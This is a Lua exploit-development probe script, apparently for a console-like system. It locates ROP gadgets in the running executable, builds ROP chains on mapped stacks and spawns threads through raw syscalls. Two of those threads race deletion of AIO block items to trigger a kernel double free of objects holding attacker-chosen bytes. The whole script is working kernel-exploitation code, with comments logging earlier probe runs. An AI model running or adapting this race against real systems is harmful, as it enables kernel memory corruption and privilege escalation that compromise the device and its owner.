-- CRASH_CLASS: HIGH
-- PROBE 791c: race the last items of 2-item aio blocks, one array call per child
--
-- Context: 791b established the sequence. A 2-item block create polls 3 on
-- both ids, deleting the first returns 0 (path B: frees only the work item),
-- deleting the last returns 0 (path A: frees C, S, D, P and T). 791a's
-- zeros=0/24 came from deleting without polling, and its long 24-call child
-- chain killed the process, so this version keeps each child to one syscall.
--
-- 662 takes an id array, so a child can walk all 24 last items in one call.
-- Two children walking the same array stay in step the way 523c's 100-id loop
-- did; every index where both report 0 is a candidate double free of that
-- block's five objects, one of which (D) holds attacker-chosen bytes.

print("=== PROBE 791c: last-item array race ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[0] gadgets missing") return end
print(string.format("[0] eboot=%X gadgets ok", ebase))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}

-- One syscall per child: 662(ids, count, status). Exactly the 727a layout:
-- a four-page stack whose last 0x200 bytes hold the chain, and RSP pointing at
-- the first chain qword, because the child enters at fn and the stub's ret
-- pops it. (RSP = base - 8 made that first ret read uninitialised stack and
-- killed the process before any aio call in 791a and 791c.)
local STACK = page*4
local function spawn_del(idpage, count, statpage)
    local block = mmap(STACK)
    local base = block + STACK - 0x200
    local p = base
    wq(p, uint64(pop_rax)); wq(p+8, uint64(431))
    wq(p+16, uint64(fn));   wq(p+24, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(idpage));  wq(ctx+Ctx.RSI, uint64(count))
    wq(ctx+Ctx.RDX, uint64(statpage)); wq(ctx+Ctx.RAX, uint64(662))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local data = mmap(page)
wd(data+0x20, 0x2A)

local M = 48
local first, last = {}, {}
local made = 0
for k=1,M do
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(2), uint64(1), uint64(o)) end)
    if okc and to_num(rvc) == 0 then
        local b = rd(o) or 0
        made = made + 1
        first[made] = b
        last[made]  = b + 0x10000
    end
end
print(string.format("[A] blocks=%d/%d first=%08X last=%08X", made, M, first[1] or 0, last[1] or 0))
if made ~= M then print("=== PROBE 791c ABORT ===") return end

-- Poll every id so the objects leave the state gate (791b: 48/48 read 3).
local allids = mmap(page)
for k=1,M do
    wd(allids + (k-1)*4, first[k])
    wd(allids + (M + k-1)*4, last[k])
end
local pp = mmap(page)
local okp, rvp = pcall(function() return mk(664)(uint64(allids), uint64(M*2), uint64(pp)) end)
local n3 = 0
for k=0,M*2-1 do if (rd(pp + k*4) or 0) == 3 then n3 = n3 + 1 end end
print(string.format("[A] poll rv=%s state3=%d/%d", tostring(to_num(rvp)), n3, M*2))

-- Path B: one item per block, so nothing is freed except the work item.
local firsts = mmap(page)
for k=1,M do wd(firsts + (k-1)*4, first[k]) end
local fst = mmap(page)
local okf, rvf = pcall(function() return mk(662)(uint64(firsts), uint64(M), uint64(fst)) end)
local fz = 0
for k=0,M-1 do if (rd(fst + k*4) or -1) == 0 then fz = fz + 1 end end
print(string.format("[B] first-item deletes rv=%s zeros=%d/%d", tostring(to_num(rvf)), fz, M))
if fz ~= M then print("=== PROBE 791c ABORT ===") return end

-- Every remaining id is now the last item of its block: path A.
local lasts = mmap(page)
for k=1,M do wd(lasts + (k-1)*4, last[k]) end
local ctl = mmap(page)
local okc1, tid1 = spawn_del(lasts, M, ctl)
sleep_ms(120)
local cz, cstat = 0, {}
for k=0,M-1 do
    local v = rd(ctl + k*4) or 0
    if v == 0 then cz = cz + 1 end
    if k < 6 then cstat[#cstat+1] = string.format("%08X", v) end
end
print(string.format("[C] control child ok=%s tid=%X zeros=%d/%d (expect %d) first=%s",
    tostring(okc1), tid1, cz, M, M, table.concat(cstat, " ")))
if cz ~= M then print("=== PROBE 791c ABORT ===") return end

-- Rebuild for the race.
local first2, last2 = {}, {}
for k=1,M do
    local o = mmap(page)
    local ok2, rv2 = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(2), uint64(1), uint64(o)) end)
    if not (ok2 and to_num(rv2) == 0) then print("[D] rebuild create failed at " .. k) return end
    local b = rd(o) or 0
    first2[k] = b
    last2[k]  = b + 0x10000
end
local all2 = mmap(page)
for k=1,M do
    wd(all2 + (k-1)*4, first2[k])
    wd(all2 + (M + k-1)*4, last2[k])
end
local pp2 = mmap(page)
pcall(function() return mk(664)(uint64(all2), uint64(M*2), uint64(pp2)) end)
local firsts2 = mmap(page)
for k=1,M do wd(firsts2 + (k-1)*4, first2[k]) end
local fst2 = mmap(page)
local okf2, rvf2 = pcall(function() return mk(662)(uint64(firsts2), uint64(M), uint64(fst2)) end)
local fz2 = 0
for k=0,M-1 do if (rd(fst2 + k*4) or -1) == 0 then fz2 = fz2 + 1 end end
print(string.format("[D] rebuilt, first deletes rv=%s zeros=%d/%d", tostring(to_num(rvf2)), fz2, M))
if fz2 ~= M then print("=== PROBE 791c ABORT ===") return end

local lasts2, sA, sB = mmap(page), mmap(page), mmap(page)
for k=1,M do wd(lasts2 + (k-1)*4, last2[k]) end
for i=0,M-1 do wd(sA + i*4, 0xAAAAAAAA); wd(sB + i*4, 0xBBBBBBBB) end
-- No sleep between the spawns: any deliberate gap lets the first child finish
-- its whole walk before the second starts (791c run 2: one=24 none=0).
local okA, tidA = spawn_del(lasts2, M, sA)
local okB, tidB = spawn_del(lasts2, M, sB)
print(string.format("[E] race children ok=%s/%s tids=%X/%X", tostring(okA), tostring(okB), tidA, tidB))
sleep_ms(200)

local dbl, one, none, oth = {}, 0, 0, {}
for k=0,M-1 do
    local a, b = rd(sA + k*4) or 0, rd(sB + k*4) or 0
    local za = (a == 0) and 1 or 0
    local zb = (b == 0) and 1 or 0
    if za + zb == 2 then dbl[#dbl+1] = k
    elseif za + zb == 1 then one = one + 1
    else none = none + 1 end
    if (a ~= 0 and a ~= 0x80020003) or (b ~= 0 and b ~= 0x80020003) then
        oth[#oth+1] = string.format("%d:%08X/%08X", k, a, b)
    end
end
print(string.format("[F] two-zero ids=%d one=%d none=%d", #dbl, one, none))
if #dbl > 0 then
    local s = {}
    for i=1,math.min(#dbl, 16) do s[#s+1] = dbl[i] end
    print("[F] double ids: " .. table.concat(s, ","))
end
print("[F] unexpected: [" .. table.concat(oth, " ") .. "]")

-- Health: the next allocations must still be sane.
local bad = 0
for k=1,8 do
    local o, st = mmap(page), mmap(page)
    local ok1, rv1 = pcall(function() return mk(669)(uint64(1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    local qp = mmap(page)
    local ok2, rv2 = pcall(function() return mk(664)(uint64(o), uint64(1), uint64(qp)) end)
    local ok3, rv3 = pcall(function() return mk(662)(uint64(o), uint64(1), uint64(st)) end)
    local id, ps, ds = rd(o) or 0, rd(qp) or 0, rd(st) or 0
    if not (ok1 and to_num(rv1) == 0 and ok3 and to_num(rv3) == 0 and ds == 0 and ps == 3) then bad = bad + 1 end
    print(string.format("[G] %d create=%s/%s id=%08X state=%08X del=%s/%08X",
        k, tostring(ok1), tostring(to_num(rv1)), id, ps, tostring(ok3), ds))
end
print(string.format("[H] health anomalies=%d/8", bad))
print("=== PROBE 791c DONE ===")
